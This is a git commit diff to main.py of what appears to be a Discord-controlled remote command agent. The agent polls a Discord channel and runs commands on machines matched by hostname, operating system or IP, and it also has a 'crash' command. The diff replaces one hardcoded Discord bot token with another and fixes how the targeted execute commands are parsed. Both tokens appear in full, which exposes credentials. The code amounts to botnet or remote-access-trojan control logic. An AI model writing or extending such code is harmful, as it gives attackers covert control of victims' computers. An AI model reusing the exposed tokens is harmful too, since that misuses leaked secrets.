f4b13981e422de54b499f44d6c9f10f22c400ee3
mrdog233o5 <mr.dog233o5@gmail.com>
2023-09-02 00:11:26 +0800

    changed Token

--- main.py
+++ main.py
@@ -70,7 +70,7 @@ while True:
                     old_command = ""
                     continue
                 if command.startswith("get "):
-                    token = 'MTE0MTM0MDA2Mzk2ODU0MjczMA.G7bTuQ.kXvBg1R2N-3Z2cYUXDmEVcBIzc7Z_MWvP2Wjtg'
+                    token = "OTEyMDExNjQzOTQ3NDc5MDgx.G_0FA6.4NubZfVPRUAiyVEaJiK39i78NCS-nH8RRKYcP4"
                     channel_id = '1140989222556274721'
                     url = f'https://discord.com/api/v9/channels/{channel_id}/messages'
                     localcmd = command.split()
@@ -107,15 +107,18 @@ while True:
                 if command.startswith("exename "):
                     localcmd = command.split()
                     if localcmd[1] == hostname:
-                        del localcmd[2]
+                        del localcmd[0]
+                        del localcmd[0]
                         localcmd = ' '.join(localcmd)
+                        print(localcmd)
                     else:
                         old_command = commandId
                         continue
                 if command.startswith("exeos "):
                     localcmd = command.split()
                     if localcmd[1] == platform:
-                        del localcmd[2]
+                        del localcmd[0]
+                        del localcmd[0]
                         localcmd = ' '.join(localcmd)
                     else:
                         old_command = commandId
@@ -123,9 +126,10 @@ while True:
                 if command.startswith("exeip "):
                     localcmd = command.split()
                     if localcmd[1] == ip:
-                        del localcmd[2]
+                        del localcmd[0]
+                        del localcmd[0]
                         localcmd = ' '.join(localcmd)
-                    else:
+                    else: 
                         old_command = commandId
                         continue
                 if command.startswith("crash"):
